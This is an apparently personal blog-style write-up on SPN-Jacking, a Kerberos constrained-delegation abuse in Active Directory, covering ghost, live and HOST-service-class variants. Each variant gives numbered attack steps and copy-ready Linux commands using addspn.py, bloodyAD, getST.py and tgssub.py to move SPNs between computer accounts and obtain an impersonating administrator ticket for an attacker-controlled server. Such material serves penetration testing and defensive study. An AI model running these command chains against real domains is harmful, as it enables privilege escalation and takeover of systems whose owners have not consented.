---
icon: usb-drive
---

# SPN-Jacking

## SPN-Jacking&#x20;

So i've been going through kerberos delegation attacks lately and one thing that really caught my attention was **SPN-Jacking**. Its a pretty intresting technique and once you understand how delegation works in AD, it all starts to make alot of sense. In this post im gonna walk through what SPN-Jacking actually is and then cover the three main types of it.

***

### What is SPN-Jacking?

Before we jump in, lets quickly recap whats going on here. In Active Directory, **Constrained Delegation** allows a service account or computer to request kerberos tickets on behalf of other users, but only to specific SPNs (Service Principal Names) that are configured by the admin.

An SPN is basically just a unique identifier that points to a service running on a specific machine. Something like `cifs/ServerB` means the CIFS service on ServerB.

Now here's the thing, when a server like **ServerA** is configured for constrained delegation, it has a list of SPNs it is allowed to delegate to. The attack idea behind SPN-Jacking is simple: what if the attacker can get one of those target SPNs associated with a machine they control? Then ServerA would basically be delegating tickets to the attacker's machine without realizing it.

Thats the core idea. Now lets look at the three different ways this can play out.

***

### Ghost SPN-Jacking

This is the simplest and cleanest version of the attack.

Imagine ServerA is configured for constrained delegation to the SPN `cifs/OldServer`. But **OldServer** doesn't exist anymore, maybe the computer account got deleted, or the machine got renamed and the SPNs were updated, so that particular SPN is now just floating out there with no account attached to it.

Since nobody owns that SPN, the attacker can just go ahead and **add it to ServerC** (a machine they control). Now when the S4U attack runs using ServerA's account, it requests a service ticket for a privileged user to `cifs/OldServer`, but that ticket is actually encrypted for ServerC since ServerC now has that SPN.

The service name inside the ticket won't match ServerC's hostname, but thats fine because the service name is **not** part of the encrypted portion of the ticket. So the attacker can just swap it out for a valid SPN on ServerC, and then use the ticket to compromise ServerC.

Pretty clean right? No conflict, no drama, just a dangling SPN waiting to be claimed.

#### Attack Steps

1. Find SPNs in the KCD configuration of ServerA
2. Confirm the target SPN has no active account associated with it
3. Add the orphaned SPN to ServerC (attacker controlled machine)
4. Run the S4U2self + S4U2proxy chain using ServerA's credentials to get an impersonating ticket
5. Edit the ticket's SPN to a valid one on ServerC
6. Pass the ticket and get access to ServerC

#### Commands (from Linux)

```bash
# 1. Show SPNs listed in the KCD configuration
findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD"

# 2. Add the ghost SPN to serverC (using addspn.py)
addspn.py -t 'ServerC$' --spn "cifs/oldserver" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.domain.local'

# 2. (Alternative) Add the ghost SPN to serverC using bloodyAD
bloodyAD -d domain.local -u 'a.white_adm' -p 'Password123!' --dc-ip 192.168.100.1 set object 'CN=ServerC,CN=Computers,DC=domain,DC=local' servicePrincipalName -v 'cifs/oldserver'

# 3. Request an impersonating service ticket through S4U2self + S4U2proxy
# Option A: get the ticket and edit the sname in one shot using -altservice
getST.py -spn "cifs/oldserver" -impersonate "administrator" -altservice "cifs/serverC" 'domain/serverA$:Password123'

# Option B: get the ticket first, then edit the sname separately with tgssub
getST.py -spn "cifs/oldserver" -impersonate "administrator" 'domain/serverA$:Password123'
tgssub.py -in oldserver.ccache -out newticket.ccache -altservice "cifs/serverC"
```

> Quick note on editing the sname: you got two ways to do it. Either you just throw `-altservice` directly in the `getST.py` command and it handles everything in one go, or you run `getST.py` first to get the ticket and then use `tgssub.py` seperately to swap the service name. Both do the same thing, just depends on what you prefer.

***

### Live SPN-Jacking

This one is a bit more involved but still very doable.

Here ServerA is configured for constrained delegation to `cifs/ServerB`, and ServerB **does** exist and actively owns that SPN. The attacker has **WriteSPN** rights on both ServerB and ServerC.

The problem is, in a fully patched environment, domain controllers won't let you have the same SPN registered on two different accounts at the same time. So if the attacker just tries to add `cifs/ServerB` to ServerC, the DC will reject it because ServerB already has it.

The workaround is a quick two step move. First, **remove** the SPN from ServerB. Then **add** it to ServerC. Now the DC is happy because there's no conflict. The attacker then runs the full S4U attack using ServerA, gets the impersonating ticket encrypted for ServerC, edits the service name, and uses it to compromise ServerC.

After the attack, a responsible attacker would roll back the changes, removing the SPN from ServerC and restoring it back to ServerB so nothing looks broken.

#### Attack Steps

1. Confirm WriteSPN rights on both ServerB and ServerC
2. Remove the target SPN from ServerB temporarily
3. Add that SPN to ServerC
4. Run S4U2self + S4U2proxy to get the impersonating ticket
5. Edit the SPN in the ticket
6. Pass the ticket to access ServerC
7. Rollback: remove SPN from ServerC and restore it to ServerB

#### Commands (from Linux)

```bash
# 1. Show SPNs listed in the KCD configuration
findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD"

# 2. Remove the SPN from ServerB first (using addspn.py)
addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'

# 2. (Alternative) Remove using bloodyAD
bloodyAD -d domain.local -u 'a.white_adm' -p 'Password123!' --dc-ip 192.168.100.1 set object 'CN=ServerB,CN=Computers,DC=domain,DC=local' servicePrincipalName -v 'WSMAN/ServerB' -v 'HOST/ServerB' -v 'RestrictedKrbHost/ServerB'

# 3. Add the SPN to ServerC (using addspn.py)
addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.domain.local'

# 3. (Alternative) Add using bloodyAD
bloodyAD -d domain.local -u 'a.white_adm' -p 'Password123!' --dc-ip 192.168.100.1 set object 'CN=ServerC,CN=Computers,DC=domain,DC=local' servicePrincipalName -v 'cifs/serverB'

# 4. Request an impersonating service ticket through S4U2self + S4U2proxy
# Option A: edit the sname inline with -altservice
getST.py -spn "cifs/serverB" -impersonate "administrator" -altservice "cifs/serverC" 'domain/serverA$:Password123'

# Option B: get ticket first then edit sname with tgssub
getST.py -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:Password123'
tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/serverC"

# 5. Rollback (restore SPN to ServerB)
addspn.py --clear -t 'ServerC$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'
addspn.py -t 'ServerB$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.domain.local'
```

> Same deal here for editing the sname, either pass `-altservice` directly to `getST.py` and its done in one step, or grab the ticket first and then run `tgssub.py` to patch the service name. Both work fine.

***

### SPN-Jacking With the HOST Service Class

This is where things get really interesting. Bear with me here.

By default every computer account in AD has SPNs registered for the `HOST` service class, something like `HOST/ServerB`. Now the HOST service class is actually a catch-all that maps to a huge list of other service classes internaly, including things like `cifs`, `http`, `spooler`, `rpc`, `dns` and many more.

So what happens if the constrained delegation SPN on ServerA is pointing to `cifs/ServerB`, but `cifs` is not explicitly registered as an SPN on ServerB, its just covered by the HOST mapping?

When the attacker tries to add `cifs/ServerB` directly to ServerC, the DC rejects it because it knows `cifs` is mapped under HOST, and HOST is already on ServerB.

The trick here is:

1. First remove the HOST SPNs from ServerB
2. Then explicitly add `cifs/ServerB` to ServerC
3. Now here's the cool part: add the HOST SPNs back to ServerB

The DC doesnt complain when you put HOST back on ServerB even though `cifs/ServerB` is now on ServerC. Thats the weird behavior being exploited here.

After this, when any client or the DC tries to resolve `cifs/ServerB`, it gets the ticket encrypted for ServerC instead of ServerB. The rest of the attack is the same, edit the ticket SPN and pass it to compromise ServerC.

#### Attack Steps

1. Identify that the target SPN is covered by HOST mapping (not explicitly set)
2. Remove HOST SPNs from ServerB
3. Explicitly add the target SPN (eg. `cifs/ServerB`) to ServerC
4. Add HOST SPNs back to ServerB (DC wont complain)
5. Run S4U attack using ServerA to get impersonating ticket encrypted for ServerC
6. Edit the ticket SPN
7. Pass the ticket to access ServerC

#### Commands (from Linux)

```bash
# 1. Show SPNs listed in the KCD configuration
findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD"

# 2. Remove HOST SPNs from ServerB (using addspn.py)
addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'

# 2. (Alternative) Remove HOST SPNs using bloodyAD
bloodyAD -d domain.local -u 'a.white_adm' -p 'Password123!' --dc-ip 192.168.100.1 set object 'CN=ServerB,CN=Computers,DC=domain,DC=local' servicePrincipalName -v 'WSMAN/ServerB' -v 'HOST/ServerB.domain.local' -v 'HOST/ServerB' -v 'RestrictedKrbHost/ServerB.domain.local' -v 'RestrictedKrbHost/ServerB' -v 'TERMSRV/ServerB' -v 'TERMSRV/ServerB.domain.local' -v 'HTTP/ServerB'

# 3. Add the explicit SPN to ServerC (using addspn.py)
addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.domain.local'

# 3. (Alternative) Add explicit SPN using bloodyAD
bloodyAD -d domain.local -u 'a.white_adm' -p 'Password123!' --dc-ip 192.168.100.1 set object 'CN=ServerC,CN=Computers,DC=domain,DC=local' servicePrincipalName -v 'cifs/serverB'

# 4. Restore HOST SPNs back on ServerB (DC allows this even with cifs/serverB now on ServerC)
addspn.py -t 'ServerB$' --spn "HOST/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.domain.local'

# 5. Request an impersonating service ticket through S4U2self + S4U2proxy
# Option A: edit the sname inline with -altservice
getST.py -spn "cifs/serverB" -impersonate "administrator" -altservice "cifs/serverC" 'domain/serverA$:Password123'

# Option B: get the ticket then edit the sname with tgssub
getST.py -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:Password123'
tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/serverC"
```

> So for editing the sname here its the same as the other types, you can either do `-altservice` directly in `getST.py` which does everything in one go, or you get the ticket first and then use `tgssub.py` to swap the service name out. Pick whatever fits your flow.

## References:

1. [https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
